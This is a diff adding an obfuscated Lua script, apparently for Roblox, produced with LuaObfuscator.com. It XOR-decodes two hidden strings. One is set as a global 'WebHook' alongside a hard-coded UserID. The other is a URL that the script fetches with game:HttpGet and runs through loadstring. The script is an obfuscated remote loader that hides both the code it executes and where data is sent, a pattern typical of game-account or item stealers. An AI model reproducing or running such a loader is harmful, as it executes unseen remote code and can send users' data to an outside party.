@@ -1,0 +1,28 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 
+
+]]--
+
+local obf_stringchar = string.char;
+local obf_stringbyte = string.byte;
+local obf_stringsub = string.sub;
+local obf_bitlib = bit32 or bit;
+local obf_XOR = obf_bitlib.bxor;
+local obf_tableconcat = table.concat;
+local obf_tableinsert = table.insert;
+local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
+	local result = {};
+	for i = 1, #LUAOBFUSACTOR_STR do
+		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1 + ((i - 1) % #LUAOBFUSACTOR_KEY) + 1))) % 256));
+	end
+	return obf_tableconcat(result);
+end
+_G.UserID = 936316911;
+_G.WebHook = LUAOBFUSACTOR_DECRYPT_STR_0("\231\29\90\74\252\83\1\21\235\0\93\89\224\27\74\20\236\6\67\21\238\25\71\21\248\12\76\82\224\6\69\73\160\88\30\15\190\90\24\15\184\90\28\13\190\80\27\9\191\89\29\14\160\95\92\95\183\93\3\82\190\51\95\118\231\11\91\76\250\3\107\66\199\54\92\73\208\35\66\124\247\40\87\117\202\14\104\116\255\39\64\96\189\19\66\15\223\13\96\67\206\47\92\11\249\44\106\110\249\42\109\99\197\1\118\108\215\93\118\11\251", "\143\105\46\58");
+loadstring(game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\188\242\13\154\56\238\169\86\152\42\163\168\30\131\63\188\243\27\159\56\177\244\26\133\37\160\227\23\158\101\183\233\20\197\61\177\245\13\147\51\251\214\28\158\24\189\235\12\134\42\160\233\11\178\10\161\242\22\172\42\166\235\86\135\42\189\232\86\162\42\167\242\28\172\42\166\235\87\134\62\181", "\212\134\121\234\75")))();
